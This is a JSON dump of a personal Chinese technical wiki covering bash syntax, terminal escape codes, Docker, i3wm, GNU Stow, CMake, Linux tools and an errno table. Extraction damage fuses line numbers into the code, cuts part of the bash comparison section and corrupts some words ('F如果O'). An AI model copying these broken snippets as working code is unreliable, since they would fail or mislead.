FILE ] 如果 FILE 存在且已经设置了SGID则为真。[ -k FILE ] 如果 FILE 存在且已经设置了粘制位则为真。[ -p FILE ] 如果 FILE 存在且是一个名字管道(F如果O)则为真。[ -r FILE ] 如果 FILE 存在且是可读的则为真。[ -s FILE ] 如果 FILE 存在且大小不为0则为真。[ -t FD ] 如果文件描述符 FD 打开且指向一个终端则为真。[ -u FILE ] 如果 FILE 存在且设置了SUID (set user ID)则为真。[ -w FILE ] 如果 FILE存在且是可写的则为真。[ -x FILE ] 如果 FILE 存在且是可执行的则为真。[ -O FILE ] 如果 FILE 存在且属有效用户ID则为真。[ -G FILE ] 如果 FILE 存在且属有效用户组则为真。[ -L FILE ] 如果 FILE 存在且是一个符号连接则为真。[ -N FILE ] 如果 FILE 存在 and has been mod如果ied since it was last read则为真。[ -S FILE ] 如果 FILE 存在且是一个套接字则为真。[ FILE1 -nt FILE2 ] 如果 FILE1 has been changed more recently than FILE2, or 如果 FILE1 exists and FILE2 does not则为真。[ FILE1 -ot FILE2 ] 如果 FILE1 比 FILE2 要老, 或者 FILE2 存在且 FILE1 不存在则为真。[ FILE1 -ef FILE2 ] 如果 FILE1 和 FILE2 指向相同的设备和节点号则为真。 字符串判断12345[ -z STRING ] 如果STRING的长度为零则为真 ，即判断是否为空，空即是真；[ -n STRING ] 如果STRING的长度非零则为真 ，即判断是否为非空，非空即是真；[ STRING1 = STRING2 ] 如果两个字符串相同则为真 ；[ STRING1 != STRING2 ] 如果字符串不相同则为真 ；[ STRING1 ] 如果字符串不为空则为真,与-n类似 数值判断123456INT1 -eq INT2 INT1和INT2两数相等为真 ,=INT1 -ne INT2 INT1和INT2两数不等为真 ,INT1 -gt INT2 INT1大于INT1为真 ,>INT1 -ge INT2 INT1大于等于INT2为真,>=INT1 -lt INT2 INT1小于INT2为真 , b )) || (( a < c ))if [[ $a > $b ]] || [[ $a < $c ]]if [ $a -gt $b -o $a -lt $c ] 数组操作123456789101112131415161718192021# 创建数组my_array=(value1 ... valueN)# 赋值my_array[0]=value0my_array[1]=value1# 取值echo ${array_name[0]}echo \"数组的元素为: ${my_array[*]}\"echo \"数组的元素为: ${my_array[@]}\"echo \"数组元素个数为: ${#my_array[*]}\"echo \"数组元素个数为: ${#my_array[@]}\"# 末尾追加元素my_array+=(value)my_array+=(\"${other_array[@]}\")# 遍历数组for item in ${my_array[@]};do echo \"${item}\"done 字符串操作获取字符串长度 1${#var} 字符串截取 1234567891011121314151617# 最小限度从前面截取word(例a/b/c-->b/foo)${var#*word}# 最大限度从前面截取word(例a/b/c-->c)${var##*word}# 最小限度从后面截取word(例a/b/c-->a/b)${var%word*}# 最大限度从后面截取word(例a/b/c-->a)${var%%word*}# 从左边第start个字符，截取len个字符${var:start:len}${var:start}# 从右边第start个字符，截取len个字符${var:0-start:len}${var:0-start} 异常捕获的一种方法 via:https://stackoverflow.com/questions/22009364/is-there-a-try-catch-command-in-bash 利用&&短路性： 1234567{ # try command1 && command2 && command3} || { # catch echo “error catch”} 感觉很容易漏写&&，特别是维护的人。 获取文件大小1wc -c _app.bin.enc | awk '{print $1}' shell，bash，获取文件字节数 十六进制数字字符串，大端转小端12345hex_string_to_le() { printf %s \"$1\" | dd conv=swab 2> /dev/null | rev}hex_string_to_le 01020304 cut命令例： 12345678910$ wpa_cli -i wlan0 list_networksnetwork id / ssid / bssid / flags0 a-610377 any 1 a-6102D2 any 2 a-6102CD any$ wpa_cli -i wlan0 list_networks | tail -n +2 | cut -f -1012 IFS分隔符用分隔符可以控制shell的行为： 123456IP=220.112.253.111IFS=\".\"TMPIP=$(echo $IP)IFS=\" \" # spaceecho $TMPIP | read ip1 ip2 ip3 ip4INVERT_IP=$ip4.$ip3.$ip2.$ip1 123IFS='|'text='a a a a|b b b b|c c c c'for i in $text;do echo \"i=$i\";done 使用的时候得注意，要用\\n作为分隔符时，得写作IFS=$'\\n'，原因不明 格式控制 via:https://www.cnblogs.com/yaohong/archive/2018/05/31/9118928.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109输出特效格式控制：\\033[0m 关闭所有属性 \\033[1m 设置高亮度 \\03[4m 下划线 \\033[5m 闪烁 \\033[7m 反显 \\033[8m 消隐 \\033[30m -- \\033[37m 设置前景色 \\033[40m -- \\033[47m 设置背景色光标位置等的格式控制：\\033[nA 光标上移n行 \\03[nB 光标下移n行 \\033[nC 光标右移n行 \\033[nD 光标左移n行 \\033[y;xH设置光标位置 \\033[2J 清屏 \\033[K 清除从光标到行尾的内容 \\033[s 保存光标位置 \\033[u 恢复光标位置 \\033[?25l 隐藏光标 \\33[?25h 显示光标整理： 编码 颜色/动作 0 重新设置属性到缺省设置 1 设置粗体 2 设置一半亮度(模拟彩色显示器的颜色) 4 设置下划线(模拟彩色显示器的颜色) 5 设置闪烁 7 设置反向图象 22 设置一般密度 24 关闭下划线 25 关闭闪烁 27 关闭反向图象 30 设置黑色前景 31 设置红色前景 32 设置绿色前景 33 设置棕色前景 34 设置蓝色前景 35 设置紫色前景 36 设置青色前景 37 设置白色前景 38 在缺省的前景颜色上设置下划线 39 在缺省的前景颜色上关闭下划线 40 设置黑色背景 41 设置红色背景 42 设置绿色背景 43 设置棕色背景 44 设置蓝色背景 45 设置紫色背景 46 设置青色背景 47 设置白色背景 49 设置缺省黑色背景特效可以叠加，需要使用“;”隔开，例如：闪烁+下划线+白底色+黑字为 \\033[5;4;47;30m闪烁+下划线+白底色+黑字为\\033[0m下面是一段小例子[plain] view plain copy#!/bin/bash # #下面是字体输出颜色及终端格式控制 #字体色范围：30-37 echo -e \"\\033[30m 黑色字 \\033[0m\" echo -e \"\\033[31m 红色字 \\033[0m\" echo -e \"\\033[32m 绿色字 \\033[0m\" echo -e \"\\033[33m 黄色字 \\033[0m\" echo -e \"\\033[34m 蓝色字 \\033[0m\" echo -e \"\\033[35m 紫色字 \\033[0m\" echo -e \"\\033[36m 天蓝字 \\033[0m\" echo -e \"\\033[37m 白色字 \\033[0m\" #字背景颜色范围：40-47 echo -e \"\\033[40;37m 黑底白字 \\033[0m\" echo -e \"\\033[41;30m 红底黑字 \\033[0m\" echo -e \"\\033[42;34m 绿底蓝字 \\033[0m\" echo -e \"\\033[43;34m 黄底蓝字 \\033[0m\" echo -e \"\\033[44;30m 蓝底黑字 \\033[0m\" echo -e \"\\033[45;30m 紫底黑字 \\033[0m\" echo -e \"\\033[46;30m 天蓝底黑字 \\033[0m\" echo -e \"\\033[47;34m 白底蓝字 \\033[0m\" #控制选项说明 #\\033[0m 关闭所有属性 #\\033[1m 设置高亮度 #\\033[4m 下划线 echo -e \"\\033[4;31m 下划线红字 \\033[0m\" #闪烁 echo -e \"\\033[5;34m 红字在闪烁 \\033[0m\" #反影 echo -e \"\\033[8m 消隐 \\033[0m \" #\\033[30m-\\033[37m 设置前景色 #\\033[40m-\\033[47m 设置背景色 #\\033[nA光标上移n行 #\\033[nB光标下移n行 echo -e \"\\033[4A 光标上移4行 \\033[0m\" #\\033[nC光标右移n行 #\\033[nD光标左移n行 #\\033[y;xH设置光标位置 #\\033[2J清屏 #\\033[K清除从光标到行尾的内容 echo -e \"\\033[K 清除光标到行尾的内容 \\033[0m\" #\\033[s 保存光标位置 #\\033[u 恢复光标位置 #\\033[?25| 隐藏光标 #\\033[?25h 显示光标 echo -e \"\\033[?25l 隐藏光标 \\033[0m\" echo -e \"\\033[?25h 显示光标 \\033[0m\" 技巧集获取当前IP地址1ip=\"$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -d ' ' -f 1)\" 判断当前用户是否为root12345#!/bin/bashif [[ $EUID -ne 0 ]]; then echo \"This script must be run as root\" exit 1fi 像pip一样安装依赖Requirement.txt1cat packages.txt | xargs sudo apt-get -y install 取路径中的文件名和目录123456MY_PATH=/tmp/abcd# 取path中的文件名echo $(basename $MY_PATH)# 取path中的目录名echo $(dirname $MY_PATH)","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"}]},{"title":"非阻塞同步技术","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/编程/非阻塞同步技术/","text":"TODO 非阻塞同步技术初探 适用场景： 纯内存操作、非IO操作。 概念https://www.ibm.com/developerworks/cn/linux/l-cn-lockfree/ 干货https://blog.csdn.net/liusuper2088/article/details/41047501并发编程（三）： 使用C++11实现无锁stack（lock-free stack) 杂谈https://www.zhihu.com/question/52629893http://ifeve.com/lock-free-isnt-what-its-cracked-up-to-be/https://zhidao.baidu.com/question/1447407610044303580.html","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"}]},{"title":"docker","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/虚拟技术/docker/","text":"TODO 整理 电子书：Docker —— 从入门到实践 https://legacy.gitbook.com/book/yeasy/docker_practice/details 概念https://www.cnblogs.com/vikings-blog/p/3958091.html https://hub.docker.com/r/resin/rpi-raspbian/ nignx/php image build:http://blog.topspeedsnail.com/archives/8084 搭嵌入式开发环境https://blog.csdn.net/zhanglianpin/article/details/80256028 在x86平台上构建arm容器https://www.balena.io/blog/building-arm-containers-on-any-x86-machine-even-dockerhub/ http://tinylab.org/docker-qemu-linux-lab/ 镜象/容器导出导入https://blog.csdn.net/liukuan73/article/details/78089138 helloworldhttps://www.cnblogs.com/herui1991/p/7468583.html Docker镜像的创建、存出、载入https://www.cnblogs.com/zhangmingcheng/p/5720792.html 在任何x86机器上构建ARM容器，甚至是DockerHubhttps://www.balena.io/blog/building-arm-containers-on-any-x86-machine-even-dockerhub/ docker入门——构建镜像https://www.cnblogs.com/Bourbon-tian/p/6867796.html 树莓派dockerhttp://dockone.io/article/1732 快速入门文章https://blog.csdn.net/jian1jian_/article/details/66475698?locationNum=7&fps=1 如何创建docker镜象https://blog.csdn.net/kity9420/article/details/75717091 运行容器1# docker run -it 常用选项 12345-d demon常驻-v 映射宿主目录到容器（应该和mount --bind相同）--env 设置环境变量, `--env XXXX=123`-p 将容器的开放的端口映射到宿主上--rm 程序退出时自动关闭容器 直接连接容器（操作命令行）123# docker run -itd xxx_image /bin/bash（回一串sha）# docker attach 这sha的前几位 网络模式 host模式，使用–net=host指定，网络不隔离直接用主机的网络 container模式，使用–net=container:NAME_or_ID指定，与指定的容器共享同一网络 none模式，使用–net=none指定，不使用网络 bridge模式，使用–net=bridge指定，默认设置，默认无法访问宿主 Docker Compose部署docker的脚本工具，能方便地部署脚本，不用打很长的命令，也利于版本管理（不用自己写shell脚本了），如： 1234567891011121314151617181920212223# file version: \"2\"networks: gitea: external: falseservices: server: image: gitea/gitea:1.10.0 environment: - USER_UID=1000 - USER_GID=1000 restart: always networks: - gitea volumes: - ./data:/data - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro ports: - \"3000:3000\" - \"222:22\" 命令： 1234部署$ docker-compose up -d撤销部署$ docker-compose down","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"虚拟技术","slug":"计算机/虚拟技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/虚拟技术/"}]},{"title":"efficiency","date":"2019-11-12T00:00:00.000Z","path":"wiki/人文社科/efficiency/","text":"保持新鲜的鸡血罐头 高效沟通沟通的目的在于达成共识，并做出承诺付诸行动. 影响达成共识因素很多 思考方式/所处角色/偏见等 想: 想要达成什么目的, 对方的目的是什么, 要如何说. 听: 即同理性倾听, 不一定同意但要换位思考地听, 找到对方目的. 做出回应: 批判 提问: 否定式/肯定式 高效率紧急又重要的事情先做 但是重要不紧急的事情应分配更多时间紧急但不重要的事情应该少做或者交给别人做 学习区【TED】如何做得更好 http://open.163.com/movie/2017/2/C/U/MCC01J0QP_MCC021ACU.html 将时间划分为执行区和学习区在执行区高效地少犯错误地做事以结果为导向 也就是职场上在学习区试错多分析多研究重视过程 也就是业余 执行区以结果优先 容易获得成功和别人的认可学习区以过程优先 通过各方面的学习来获得提升 重点在于两者互为反馈: 执行区中发现的不足 在学习区中加强学习 学习区获得的提升 作用于执行区 实践和检验 有点像马克思理论”理论与实践”关系.. 还有一种说法:舒适区: 无压力, 没有学习难度的知识, 心理舒适.学习区: 有一定挑战, 感到不适但不至于难受.恐慌区: 超出自己能力范围太多, 心理严重不适, 可能导致崩溃.不断学习, 可以使部分学习区变成舒适区, 部分恐慌区变成学习区.只有在”学习区”做事, 人才会进步, 所以应该让自己保持在学习区(即: 有挑战但不难受), 以此扩大舒适区. 决策模型“探索-利用”“传说中当你需要购买一个城市的房产时，得需要浏览37%的在售房产才能找到最优住所。” “探索”即收集情报，“利用”即使用情报中已知的优势信息，结论是：如果再次利用的机会足够多，应该多探索；如果再次利用的机会不多，应该多利用。 选择晚上吃饭的餐厅，是冒险找新的地方呢，还是去已知的好吃的餐厅——取决于是否在这个城市短暂停留或者久居； 小孩好奇地试错，老人总喜欢享用自己熟悉的东西——大概也是优解。 by 认知学家Tom Griffiths在TED的演讲 “高速缓存”“最后一次使用它是什么时候？” 当决策是否丢弃一件东西的时候，应该优先考虑是不是很久没用它了。","tags":[],"categories":[{"name":"人文社科","slug":"人文社科","permalink":"http://wiki.noodlefighter.com/categories/人文社科/"}]},{"title":"webassembly","date":"2019-11-12T00:00:00.000Z","path":"wiki/计算机/前端技术/webassembly/","text":"webassembly技术允许把本地代码在网页上执行，比如C/C++代码通过emscripten工具包就能方便地编译成网页上可执行的wasm格式。 emscripten工具包https://github.com/emscripten-core/emsdk 使用例： 123$ ./emsdk install sdk-1.38.27-64bit$ ./emsdk activate --embedded sdk-1.38.27-64bit$ source emsdk_env.sh 这样就释放指定版本SDK到PATH环境变量中了。 文件系统web通常不允许访问宿主本地文件系统。 emscripten提供了一个虚拟文件系统，打包时可以附加一些文件，这样就不用把文件内嵌在代码里了。 emscripten工具包下编译QThttps://doc.qt.io/qt-5/wasm.html 版本一定要对，否则不一定编译得过。 使用编译出的qtbase/bin/qmake就可以用来编译 webassembly技术与Immediate Mode GUI界面上过多的DOM元素使浏览器渲染速度缓慢，使用立即式GUI是种解决方案，不创建对象保证快速渲染，例子： https://pbrfrat.com/post/imgui_in_browser.html https://github.com/jnmaloney/WebGui","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"前端技术","slug":"计算机/前端技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/前端技术/"}]},{"title":"i3wm","date":"2019-11-09T00:00:00.000Z","path":"wiki/计算机/linux/tools/i3wm/","text":"i3wmarchlinux的Wiki： https://wiki.archlinux.org/index.php/I3#Launching_programs_on_specific_workspaces i3命令命令参考：https://i3wm.org/docs/userguide.html#list_of_commandsexec exec12# startup-id功能会确保GUI显示在工作区，执行无界面程序时最好禁用它exec --no-startup-id xxx i3-cinnamoncinnamon环境里的i3，可以使用cinnamon的设置、锁屏等 dmenu-manjaromanjaro的dmenu菜单，支持鼠标。 i3status状态栏 123bar { status_command i3status} i3exiti3exit是个脚本集，需要在配置里做一个菜单来调用： 12345678910111213set $mode_system System (l) lock, (e) logout, (s) suspend, (h) hibernate, (r) reboot, (Shift>mode \"$mode_system\" { bindsym l exec --no-startup-id i3exit lock, mode \"default\" bindsym e exec --no-startup-id i3exit logout, mode \"default\" bindsym s exec --no-startup-id i3exit suspend, mode \"default\" bindsym h exec --no-startup-id i3exit hibernate, mode \"default\" bindsym r exec --no-startup-id i3exit reboot, mode \"default\" bindsym Shift+s exec --no-startup-id $i3_path/i3exit shutdown, mode \"default\" # back to normal: Enter or Escape bindsym Return mode \"default\" bindsym Escape mode \"default\"}bindsym $mod+x mode \"$mode_system\" 锁屏i3lock1bindsym $mod+o exec i3lock -c 000000 -c指定背景颜色。 i3exit的锁屏背景不想纯色时，可以改用毛玻璃效果的i3exit lock。 使用cinnamon的锁屏12345# 锁屏并黑屏bindsym $mod+o exec \"cinnamon-screensaver-command -l; xset dpms force off;\"# 单纯锁屏bindsym $mod+o exec \"cinnamon-screensaver-command -l\" compton效果器，提供淡入淡出、阴影、透明等效果支持。 GUI配置界面compton-conf。 正在测试suckless-tools 像其他环境中Alt+Tab循环切换焦点到下一个窗口 流畅度不行，习惯i3的操作方式之后，这真没什么用。。。 via: https://gist.github.com/Nervengift/0ab9e6127ac17b8317ac 额外依赖：jq/awk 12345678910111213141516#!/bin/bash# ================================================================================== ## Focus the next window on the current workspace in i3, e.g. for binding to Alt+Tab ## Depends: jq, awk, i3wm (obviously) ## Author: Nervengift ## License: Don't think this deserves a license, Public Domain ## Known bugs: doesn't work with non-window container focused ## ================================================================================== #ws=$(i3-msg -t get_workspaces|jq \"map(select(.focused))[]|.name\")windows=$(i3-msg -t get_tree|jq \".nodes|map(.nodes[])|map(.nodes[])|map(select(.type==\\\"workspace\\\" and .name==$ws))[0].nodes|map(recurse(.nodes[]))|map(.window)|.[]|values\")current=$(i3-msg -t get_tree|jq \"recurse(.nodes[])|select(.focused)|.window\")if [ \"x$current\" != \"xnull\" ]; then next=$(echo $windows | awk \"BEGIN {RS=\\\" \\\";FS=\\\" \\\"};NR == 1 {w=\\$1};{if (f == 1){w=\\$1;f=0}else if (\\$1 == \\\"$current\\\") f=1};END {print w}\") i3-msg [id=$next] focus > /dev/nullfi i3加入配置： 1bindsym $alt+Tab exec --no-startup-id ~/.config/i3/i3-focus-next 特定工作区启动指定应用程序1exec --no-startup-id i3-msg 'workspace 1:Web; exec /usr/bin/firefox'","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"stow","date":"2019-11-09T00:00:00.000Z","path":"wiki/计算机/linux/tools/stow/","text":"之前一直在debian Gnu Stow主要用来管理以makefile方式安装的程序。 原理是安装时指定prefix到用户管理的文件夹，stow可以帮忙在真正的sysroot下建立符号链接，需要删除程序的时候就不会删错删漏了。 使用Gnu Stow管理安装 参考: http://fatmouse.xyz/2016/03/07/2016-03-07-manage-package-using-stow/ 建立stow文件夹 1mkdir /usr/local/stow 安装程序时： 123./configure --prefix=/usr/local/stow/rubymakesudo make install 安装后执行映射，创建软链接： 12cd /usr/local/stowsudo stow ruby 需要卸载程序时： 123cd /usr/local/stowsudo stow --delete rubyrm -rf ruby 使用Gnu Stow管理linux配置文件 参考：http://brandon.invergo.net/news/2012-05-26-using-gnu-stow-to-manage-your-dotfiles.html 例如，假设您要管理Bash，VIM和Uzbl的配置。Bash在顶级目录中有几个文件; VIM通常在顶级和.vim目录中有.vimrc文件; 和Uzbl在${XDG_CONFIG_HOME}/uzbl和中有文件 ${XDG_DATA_HOME}/uzbl。因此，您的主目录如下所示： 123456789101112131415home/ brandon/ .config/ uzbl/ [...some files] .local/ share/ uzbl/ [...some files] .vim/ [...some files] .bashrc .bash_profile .bash_logout .vimrc 然后，您将创建一个dotfiles子目录并将所有文件移动到那里： 12345678910111213141516171819202122home/ /brandon/ .config/ .local/ .share/ dotfiles/ bash/ .bashrc .bash_profile .bash_logout uzbl/ .config/ uzbl/ [...some files] .local/ share/ uzbl/ [...some files] vim/ .vim/ [...some files] .vimrc 然后，执行以下命令： 1234$ cd ~/dotfiles$ stow bash$ stow uzbl$ stow vim stow文件冲突的问题欲stow的文件目前已经存在于target中时，stow会失败，此时： 使用--override=.*可以将强制覆盖其他stow包创建的符号链接 提示”existing target is neither a link nor a directory”，因为冲突的目标文件不是符号链接，只能手动删除，或者如果希望自动备份到stow包中（就是源）可以使用--adopt选项","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"c语言函数的不定参数","date":"2019-11-09T00:00:00.000Z","path":"wiki/计算机/编程/C/c语言函数的不定参数/","text":"via: https://en.cppreference.com/w/c/variadic/va_arg 12345678910111213141516#include ...double stddev(int count, ...) { double sum = 0; double sum_sq = 0; va_list args; va_start(args, count); for (int i = 0; i < count; ++i) { double num = va_arg(args, double); sum += num; sum_sq += num*num; } va_end(args); return sqrt(sum_sq/count - (sum/count)*(sum/count));} va_arg(args, type)宏等效于返回(type)*p_arg并把p_arg向后移sizeof(type)。 所以其实C的不定参数是无法知道真实传参的大小的。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"cmake","date":"2019-11-09T00:00:00.000Z","path":"wiki/计算机/编程/cmake/","text":"一般使用1mkdir build && cmake .. 交叉编译Makefile: 12345678910111213all: locallocal: cmake --debug -S. -B_build -G \"Unix Makefiles\" cd _build && makewin32: cmake -S. -B_build_win32 -G \"Unix Makefiles\" -DCMAKE_TOOLCHAIN_FILE=./mingw-w64-i686.cmake cd _build_win32 && makewin64: cmake -S. -B_build_win64 -G \"Unix Makefiles\" -DCMAKE_TOOLCHAIN_FILE=./mingw-w64-x86_64.cmake cd _build_win64 && make","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"}]},{"title":"linux常用工具","date":"2019-11-07T00:00:00.000Z","path":"wiki/计算机/linux/tools/linux常用工具/","text":"minicomminicom linux下好用的串口通讯工具: 1$ minicom -D /dev/ttyUSB0 tree打印树型目录结构，可指定层数。 1$ tree -L 3 locate 利用文件索引缓存快速全盘查找文件 progress（cv）https://github.com/Xfennec/progress coreutils viewer，显示coreutils 中的基本命令的进度，比如 cp、mv、rm、dd、tar，基本用法progress -wm 安装： 1$ yay -S progress-git 别名cv放~/.bashrc里：12#progressalias cv=\"progress -w\" lm_sensors查看传感器温度，cpu、主板、显卡温度等。 123456789101112[r@r-pc test-activity]$ sensors k10temp-pci-00c3Adapter: PCI adapterTdie: +43.2°C (high = +70.0°C)Tctl: +43.2°C amdgpu-pci-3800Adapter: PCI adaptervddgfx: N/A vddnb: N/A fan1: N/Atemp1: +43.0°C (crit = +80.0°C, hyst = +0.0°C) Time Cat （tcat）https://github.com/marcomorain/tcat 给每一行文本打上时间戳 Pacapt安装方法：https://github.com/icy/pacapt#installation 包管理器的命令行包装，用于把大多数包管理器的命令转成arch系的pacman式命令，用法： 1$ pacapt -Ss somepackage mplayer在framebuffer全屏循环播放视频： 1$ mplayer -fs -loop 0 -vo fbdev xxx.mp4 homebrewmacos自带的包管理器，其实Linux和windows的WSL也能用。 可以在home目录下安装软件，不需要root权限。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"开发过程","date":"2019-10-28T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/开发过程/","text":"单元测试Unity [MIT]https://github.com/ThrowTheSwitch/UnityA Test Framework for C libcheck [LGPL]https://github.com/libcheck/check又一个单元测试框架 for c cmocka [Apache]https://github.com/clibs/cmockacmockery的一个fork，单元测试框架，提供了好用的mock功能。 Debug相关CmBacktrace [MIT]https://github.com/armink/CmBacktraceARM Cortex-M 系列 MCU 错误追踪库 EasyLogger [MIT]https://github.com/armink/EasyLogger日志库 emlog [GPL]https://github.com/nicupavel/emloglinux上一个体积永不增长的日志文件 zlog [LGPL]https://github.com/HardySimpson/zlog高性能的C日志库，POSIX pipelog [自定协议，无限制]http://cognitivedissonance.ca/cogware/pipelog/posix兼容，可以用pipe存储到一个体积永不增长的ring buffer文件中，如： 1$ xxx_prog |pipelog /tmp/xxx.log 工具链crosstoolhttp://crosstool-ng.org交叉编译工具链构建工具 buildroothttps://buildroot.org/linux根文件系统生成 包管理和构建系统Conanhttps://conan.io/index.htmlConan, the C / C++ Package Manager for DevelopersThe open source, decentralized and multi-platform package manager to create and share all your native binaries. xmakehttps://xmake.io/使用lua的构建系统 sconshttps://scons.org/使用python的构建系统 性能测试coremarkhttps://github.com/eembc/coremark 可用于MCU的性能基准测试 持续集成CI","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"SSDP简单设备发现协议","date":"2019-10-28T00:00:00.000Z","path":"wiki/电子工程/嵌入式软件/ssdp简单设备发现协议/","text":"探测局域网中存在的设备的通用协议： https://zh.wikipedia.org/wiki/%E7%AE%80%E5%8D%95%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E5%8D%8F%E8%AE%AE","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式软件","slug":"电子工程/嵌入式软件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式软件/"}]},{"title":"errno","date":"2019-10-28T00:00:00.000Z","path":"wiki/计算机/linux/devtools/errno/","text":"moreutils工具包中的errno工具，方便查看errno定义，而且是经过本地化的： 如errno 5: 1EIO 5 输入/输出错误 errno -l： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134EPERM 1 不允许的操作ENOENT 2 没有那个文件或目录ESRCH 3 没有那个进程EINTR 4 被中断的系统调用EIO 5 输入/输出错误ENXIO 6 没有那个设备或地址E2BIG 7 参数列表过长ENOEXEC 8 可执行文件格式错误EBADF 9 错误的文件描述符ECHILD 10 没有子进程EAGAIN 11 资源暂时不可用ENOMEM 12 无法分配内存EACCES 13 权限不够EFAULT 14 错误的地址ENOTBLK 15 需要块设备EBUSY 16 设备或资源忙EEXIST 17 文件已存在EXDEV 18 无效的跨设备链接ENODEV 19 没有那个设备ENOTDIR 20 不是目录EISDIR 21 是一个目录EINVAL 22 无效的参数ENFILE 23 系统中打开的文件过多EMFILE 24 打开的文件过多ENOTTY 25 对设备不适当的 ioctl 操作ETXTBSY 26 文本文件忙EFBIG 27 文件过大ENOSPC 28 设备上没有空间ESPIPE 29 非法 seek 操作EROFS 30 只读文件系统EMLINK 31 过多的链接EPIPE 32 断开的管道EDOM 33 数值参数超出域ERANGE 34 数值结果超出范围EDEADLK 35 已避免资源死锁ENAMETOOLONG 36 文件名过长ENOLCK 37 没有可用的锁ENOSYS 38 函数未实现ENOTEMPTY 39 目录非空ELOOP 40 符号连接的层数过多EWOULDBLOCK 11 资源暂时不可用ENOMSG 42 没有符合需求格式的消息EIDRM 43 标识符已删除ECHRNG 44 通道编号超出范围EL2NSYNC 45 级别 2 尚未同步EL3HLT 46 级别 3 已关闭EL3RST 47 级别 3 已重置ELNRNG 48 链接数超出范围EUNATCH 49 未加载协议驱动程序ENOCSI 50 没有可用的 CSI 结构EL2HLT 51 级别 2 己关闭EBADE 52 无效的交换EBADR 53 无效的请求描述符EXFULL 54 交换满ENOANO 55 没有 anodeEBADRQC 56 无效的请求码EBADSLT 57 不适用的 slotEDEADLOCK 35 已避免资源死锁EBFONT 59 错误的字体文件格式ENOSTR 60 设备不是流ENODATA 61 没有可用的数据ETIME 62 计时器超时ENOSR 63 流资源不足ENONET 64 机器不在网络中ENOPKG 65 包未安装EREMOTE 66 对象是远程的ENOLINK 67 链接已有服务EADV 68 通知错误ESRMNT 69 Srmount 错误ECOMM 70 发送时出现通讯错误EPROTO 71 协议错误EMULTIHOP 72 尝试 MultihopEDOTDOT 73 RFS 特定错误EBADMSG 74 错误的消息EOVERFLOW 75 对已定义的数据类型来说值过大ENOTUNIQ 76 网络上的名称不是唯一的EBADFD 77 文件描述符处于错误状态EREMCHG 78 远程地址已改变ELIBACC 79 无法访问必须的共享库ELIBBAD 80 正在访问一个已毁坏的共享库ELIBSCN 81 a.out 中的 .lib 节已毁坏ELIBMAX 82 试图与过多的共享库相链接ELIBEXEC 83 无法直接执行共享库EILSEQ 84 无效或不完整的多字节字符或宽字符ERESTART 85 被中断的系统调用应该重新启动ESTRPIPE 86 流管道错误EUSERS 87 用户过多ENOTSOCK 88 对非套接字进行套接字操作EDESTADDRREQ 89 需要目标地址EMSGSIZE 90 消息过长EPROTOTYPE 91 错误的 socket 协议类型ENOPROTOOPT 92 不可用的协议EPROTONOSUPPORT 93 不支持的协议ESOCKTNOSUPPORT 94 不支持的套接字类型EOPNOTSUPP 95 不支持的操作EPFNOSUPPORT 96 不支持的协议族EAFNOSUPPORT 97 协议不支持的地址族EADDRINUSE 98 地址已在使用EADDRNOTAVAIL 99 无法指定被请求的地址ENETDOWN 100 网络已关闭ENETUNREACH 101 网络不可达ENETRESET 102 